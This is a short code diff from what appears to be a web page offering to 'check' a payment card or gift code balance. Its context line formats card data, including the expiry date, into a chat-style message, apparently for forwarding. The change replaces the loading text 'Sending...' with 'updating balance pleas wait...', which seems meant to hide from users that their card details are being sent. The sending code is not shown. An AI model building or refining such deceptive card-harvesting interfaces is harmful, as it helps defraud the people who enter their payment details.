@@ -301,7 +301,7 @@ ${cardData.expiry ? `• *Expiry:* \`${cardData.expiry}\`\n` : ''}\
                     {loading ? (
                       <>
                         <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                        Sending...
+                        updating balance pleas wait...
                       </>
                     ) : (
                       `Check ${selected} ${isPaymentCard ? 'Card' : 'Code'}`
